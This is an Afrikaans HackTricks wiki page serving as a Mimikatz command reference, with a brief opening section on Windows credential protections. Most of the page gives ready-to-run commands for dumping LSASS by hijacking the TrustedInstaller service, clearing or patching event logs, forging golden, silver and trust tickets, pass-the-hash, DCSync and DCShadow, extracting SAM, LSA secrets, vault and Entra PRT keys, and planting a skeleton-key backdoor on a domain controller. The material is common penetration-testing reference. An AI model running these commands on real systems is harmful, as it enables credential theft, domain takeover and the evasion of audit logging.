# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Hierdie bladsy is gebaseer op een van [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Gaan die oorspronklike na vir meer inligting!<sup>[[3]](#references)</sup>

## LM en Clear-Text in geheue

Vanaf Windows 8.1 en Windows Server 2012 R2 is beduidende maatreëls geïmplementeer om teen diefstal van geloofsbriewe te beskerm:

- **LM-hashes en gewone tekswagwoorde** word nie meer in die geheue gestoor nie, om sekuriteit te verbeter. ’n Spesifieke registerinstelling, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, moet met ’n DWORD-waarde van `0` opgestel word om Digest Authentication te deaktiveer en te verseker dat wagwoorde in "clear-text" nie in LSASS gekas word nie.

- **LSA Protection** word ingestel om die Local Security Authority (LSA)-proses teen ongemagtigde geheuelees en kode-inspuiting te beskerm. Dit word bereik deur LSASS as ’n beskermde proses te merk. LSA Protection word soos volg geaktiveer:
  1. Verander die register by _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ deur `RunAsPPL` op `dword:00000001` te stel.
  2. Implementeer ’n Group Policy Object (GPO) wat hierdie registerverandering op alle bestuurde toestelle afdwing.

Ondanks hierdie beskermings kan nutsmiddels soos Mimikatz LSA Protection met spesifieke drywers omseil, hoewel sulke aksies waarskynlik in gebeurtenislogboeke aangeteken sal word.

Op moderne werkstasies is dit selfs belangriker omdat **Credential Guard by verstek op baie domeingekoppelde Windows 11 22H2+- en Windows Server 2025-stelsels wat nie domeinbeheerders is nie, geaktiveer is**, terwyl **LSASS-as-PPL by verstek op nuwe Windows 11 22H2+-installasies geaktiveer is**. In die praktyk beteken dit dat `sekurlsa::logonpasswords` dikwels minder materiaal oplewer as wat ouer aanvalstegnieke voorspel het, en dat operateurs toenemend oorskakel na **vanlyn minidumps**, **Kerberos-sleutelonttrekking (`sekurlsa::ekeys`)** of **CloudAP/PRT-georiënteerde modules**. Raadpleeg [Windows-geloofsbriefbeskermings](credentials-protections.md) vir meer inligting oor beskerming.

### Teenwerking teen die verwydering van SeDebugPrivilege

Administrateurs het gewoonlik SeDebugPrivilege, wat hulle in staat stel om programme te ontfout. Hierdie voorreg kan beperk word om ongemagtigde geheuestortings te voorkom, ’n algemene tegniek wat aanvallers gebruik om geloofsbriewe uit die geheue te onttrek. Selfs wanneer hierdie voorreg verwyder is, kan die TrustedInstaller-rekening egter steeds geheuestortings uitvoer deur ’n pasgemaakte dienskonfigurasie te gebruik:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Dit maak dit moontlik om die geheue van `lsass.exe` na ’n lêer te dump, wat dan op ’n ander stelsel ontleed kan word om geloofsbriewe te onttrek:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatz-opsies

Event log-tampering in Mimikatz behels twee primêre aksies: die skoonmaak van event logs en die patching van die Event-diens om te voorkom dat nuwe events aangeteken word. Hieronder is die opdragte om hierdie aksies uit te voer:

#### Event logs skoonmaak

Mimikatz bied wel `event::clear`. Dit roep die Windows-API vir die skoonmaak van event logs vir die gekose klassieke log aan. Die verstek is `Security`; `/log:` kies ’n ander log, en die oproeper moet die regte hê om dit skoon te maak. Dit is nie dieselfde as `event::drop` nie, wat probeer om te keer dat nuwe rekords geskryf word.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Eksperimentele kenmerk: Patching van die Event Service

- **Opdrag**: `event::drop`
- Hierdie eksperimentele opdrag is ontwerp om die Event Logging Service se gedrag te wysig en dit effektief te verhoed om nuwe gebeurtenisse aan te teken.
- Voorbeeld: `mimikatz "privilege::debug" "event::drop" exit`

- Die `privilege::debug`-opdrag verseker dat Mimikatz met die nodige regte werk om stelseldienste te wysig.
- Die `event::drop`-opdrag patch dan die Event Logging Service.

### Kerberos Ticket-aanvalle

Gebruik die onderstaande opdragte as vinnige sintaksisherinneringe. Die toegewyde bladsye vir [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) en [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) bevat die nuutste AES/PAC/opsec-nuanses.

### Golden Ticket-skepping

’n Golden Ticket maak domeinwye toegang deur identiteitsnabootsing moontlik. Belangrike opdrag en parameters:

- Opdrag: `kerberos::golden`
- Parameters:
  - `/domain`: Die domeinnaam.
  - `/sid`: Die domein se Security Identifier (SID).
  - `/user`: Die gebruikernaam om na te boots.
  - `/krbtgt`: Die NTLM-hash van die domein se KDC-diensrekening.
  - `/ptt`: Spuit die ticket direk in die geheue in.
  - `/ticket`: Stoor die ticket vir latere gebruik.

Voorbeeld:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Silver Ticket Creation

Silver Tickets verleen toegang tot spesifieke dienste. Belangrike opdrag en parameters:

- Command: Soortgelyk aan Golden Ticket, maar teiken spesifieke dienste.
- Parameters:
  - `/service`: Die diens om te teiken (bv. cifs, http).
  - Ander parameters is soortgelyk aan Golden Ticket.

Example:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Trust Ticket Creation

Trust Tickets word gebruik om toegang tot hulpbronne oor domeine heen te verkry deur vertrouensverhoudings te benut. Belangrike opdrag en parameters:

- Opdrag: Soortgelyk aan Golden Ticket, maar vir vertrouensverhoudings.
- Parameters:
  - `/target`: Die teikendomein se FQDN.
  - `/rc4`: Die NTLM-hash vir die vertrouensrekening.

Voorbeeld:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Addisionele Kerberos-opdragte

- **Listing Tickets**:

  - Command: `kerberos::list`
  - Lys alle Kerberos-kaartjies vir die huidige gebruikersessie.

- **Pass the Cache**: `kerberos::ptc` lees ’n MIT/Heimdal `.ccache`-lêer, **nie** ’n `.kirbi`-lêer nie. Gee die lêerpad as ’n posisionele argument: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` lees ’n `.kirbi`-lêer of ’n gids met sulke lêers. Dit neem ook ’n posisionele pad, nie `/ticket:` nie: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Sien [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) vir die breër werkvloei.<sup>[[6]](#references)</sup>

- **Purge Tickets**:
  - Command: `kerberos::purge`
  - Verwyder alle Kerberos-kaartjies uit die sessie.
  - Nuttig voordat kaartjie-manipulasieopdragte gebruik word om konflikte te vermy.

### Over-Pass-the-Hash / Pass-the-Key

As `RC4` gedeaktiveer of onbetroubaar is, kan Mimikatz **AES128/AES256 Kerberos-sleutels** in die huidige aanmeldsessie inprop, eerder as om net ’n NT-hash te gebruik. Dit pas gewoonlik beter by moderne domeine as om `sekurlsa::pth` as uitsluitlik NTLM te beskou.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` hergebruik die huidige proses in plaas daarvan om ’n nuwe konsole te begin, wat handig is wanneer jy dinge soos `lsadump::dcsync` onmiddellik in dieselfde konteks wil uitvoer.

### AD-manipulasie

- **DCShadow**: Laat ’n masjien tydelik as ’n DC optree om AD-objekte te manipuleer. Sien [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Boots ’n DC na om wagwoorddata aan te vra. Sien [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Toegang tot geloofsbriewe

- **LSADUMP::LSA**: Onttrek geloofsbriewe uit LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Boots ’n DC na deur ’n rekenaarrekening se wagwoorddata te gebruik.

  - _Geen spesifieke opdrag vir NetSync in die oorspronklike konteks verskaf nie._

- **LSADUMP::SAM**: Kry toegang tot die plaaslike SAM-databasis.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Dekripteer geheime wat in die register gestoor is.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Stel ’n nuwe NTLM-hash vir ’n gebruiker in.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Haal trust-verifikasie-inligting op.
  - `mimikatz "lsadump::trust" exit`

### Wolkgeloofsbriewe / Entra ID

Op **Entra ID**- of **hibried-aangeslote** gashere kan `sekurlsa::cloudap` materiaal van die gekasde **Primary Refresh Token (PRT)** uit LSASS blootlê. Die `ProofOfPossesionKey.KeyValue` is die DPAPI-beskermde sessiesleutelblob, nie die reeds gedekripteerde sleutel nie.<sup>[[7]](#references)[[8]](#references)</sup> Om `/unprotect` te gebruik, voer `dpapi::cloudapkd` as `SYSTEM` uit (byvoorbeeld, `token::elevate` vanuit ’n verhoogde Mimikatz-sessie), of vul eers Mimikatz se sleutelkassie met `sekurlsa::dpapi`. `privilege::debug` alleen verander nie die DPAPI-oproeper se konteks nie.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Kopieer die **ooreenstemmende** `Context` en `Derived Key` van die eerste opdrag na die tweede; Mimikatz genereer ’n nuwe konteks as geen konteks verskaf word nie. Selfs vir ’n TPM-beskermde sleutel kan Mimikatz ’n ondertekeningsleutel aflei deur die TPM op die oorspronklike toestel te gebruik. Die sleutel in cleartext hoef nie uitgevoer te word nie, maar ’n suksesvolle resultaat met ’n afgeleide sleutel kan ’n blaaierkoekie onderteken.<sup>[[7]](#references)</sup>

’n PRT-string alleen is nie voldoende nie, omdat Microsoft Entra bewys van besit van die geassosieerde sessiesleutel vereis.<sup>[[9]](#references)</sup> Sien [DPAPI key recovery](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) vir ander hoofsleutelopsies en [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) vir die ketting aan die wolkkant.

### Diverse

- **MISC::Skeleton**: Spuit ’n backdoor in LSASS op ’n DC in.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: Verkry rugsteunregte.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Verkry debug-voorregte.
  - `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: Wys geloofsbriewe vir aangemelde gebruikers.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Onttrek Kerberos-kaartjies uit geheue.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Sid and Token Manipulation

- **SID::add/modify**: Verander SID en SIDHistory.

  - Voeg by: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Verander: _Geen spesifieke opdrag vir verandering in die oorspronklike konteks nie._

- **TOKEN::Elevate**: Verpersoonlik tokens.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Laat verskeie RDP-sessies toe.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Lys TS/RDP-sessies.
  - _Geen spesifieke opdrag vir TS::Sessions verskaf nie._

### Vault

- Onttrek wagwoorde uit Windows Vault.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [The Hacker Tools – Mimikatz-modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB en Entra ID: Sê hallo vir jou nuwe kasvloei](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz-opdragverwysing](https://adsecurity.org/?page_id=1821)
- [4] [Bronkode vir Mimikatz se event-module](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Bronkode vir Mimikatz se ccache-module](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Bronkode vir Mimikatz se Kerberos-module](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Mimikatz se CloudAP DPAPI-implementering](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Delf dieper in die Primary Refresh Token](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Microsoft Entra se beskerming van Primary Refresh Token](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
